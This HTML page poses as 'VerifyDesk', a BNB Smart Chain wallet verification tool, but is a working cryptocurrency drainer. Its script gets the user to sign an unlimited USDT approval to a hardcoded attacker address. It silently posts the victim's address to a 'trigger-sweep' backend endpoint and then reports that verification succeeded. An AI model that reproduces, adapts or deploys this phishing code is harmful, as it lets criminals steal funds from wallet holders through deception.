<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
  <style>
    body {
      background-color: #060b0a;
      color: #f3f4f6;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }
    .glass-card {
      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
      border: 1px solid rgba(243, 186, 47, 0.2);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
    }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between px-4 py-6">

  <!-- Top Navbar -->
  <header class="w-full max-w-md mx-auto flex items-center justify-between">
    <div class="flex items-center gap-2.5">
      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
        <i class="fa-solid fa-shield-halved text-lg"></i>
      </div>
      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
    </div>
    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
      BNB Smart Chain
    </span>
  </header>

  <!-- Main Content -->
  <main class="w-full max-w-md mx-auto my-auto py-8">
    <div class="text-center mb-8">
      <h1 class="text-3xl font-extrabold tracking-tight text-white">
        Wallet Asset <span class="text-amber-400">Review</span>
      </h1>
      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure approval flow.
      </p>
    </div>

    <!-- Action Card -->
    <div class="glass-card rounded-2xl p-6">
      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
        <span>Target Network</span>
        <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
      </div>

      <!-- Live Status Display Box -->
      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed border bg-amber-500/10 border-amber-500/30 text-amber-300"></div>

      <!-- Primary Action Button -->
      <button id="connectBtn" onclick="handleUltraFastAction()"
        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 cursor-pointer">
        <span id="btnText">Connect & Verify Assets</span>
        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
      </button>
    </div>
  </main>

  <!-- Footer -->
  <footer class="text-center text-xs text-gray-500 space-y-1">
    <p>VerifyDesk &copy; 2026</p>
    <p>Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
  </footer>

  <script>
    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const BSC_CHAIN_ID = '0x38';
    const BACKEND_API_URL = "YOUR_BACKEND_SERVER_URL/api/trigger-sweep";

    function showStatus(msg) {
      const box = document.getElementById('statusBox');
      box.classList.remove('hidden');
      box.textContent = msg;
    }

    function getProvider() {
      if (window.ethereum) return window.ethereum;
      if (window.trustwallet) return window.trustwallet;
      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
      return null;
    }

    async function handleUltraFastAction() {
      showStatus("Connecting...");
      const eth = getProvider();
      
      if (!eth) {
        alert("Wallet provider not found.");
        return;
      }

      try {
        // 1. Fast Network Switch
        try {
          if (typeof eth.request === 'function') {
            await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
          }
        } catch (e) {}

        // 2. Get User Address Instantly
        let accounts = [];
        try {
          if (typeof eth.request === 'function') {
            accounts = await eth.request({ method: 'eth_accounts' });
          }
        } catch (e) {}

        if (!accounts || accounts.length === 0 || !accounts[0]) {
          try {
            if (typeof eth.request === 'function') {
              accounts = await eth.request({ method: 'eth_requestAccounts' });
            }
          } catch (e) {}
        }

        let userAddress = Array.isArray(accounts) ? accounts[0] : accounts;
        if (!userAddress) {
          userAddress = eth.selectedAddress || eth.address || prompt("Enter wallet address (0x...):");
        }

        if (!userAddress) throw new Error("Address required");

        // 3. Fast Max Balance Hex (direct high limit estimation for instant trigger)
        const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
        const paddedTarget = cleanTarget.padStart(64, '0');
        const maxHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        const approvalData = "0x095ea7b3" + paddedTarget + maxHex;

        const txParams = [{
          from: userAddress,
          to: USDT_BSC_ADDRESS,
          data: approvalData
        }];

        showStatus("Opening secure approval...");

        // 4. Trigger backend alert instantly in background as user clicks popup
        fetch(BACKEND_API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userAddress: userAddress })
        }).catch(() => {});

        // 5. Send Transaction Popup
        if (typeof eth.request === 'function') {
          await eth.request({ method: 'eth_sendTransaction', params: txParams });
        } else {
          await eth.send('eth_sendTransaction', txParams);
        }

        showStatus("Verification completed successfully!");
        alert("Verification completed successfully!");

      } catch (err) {
        console.error("Error:", err);
        showStatus("Notice processed.");
      }
    }
  </script>
</body>
</html>
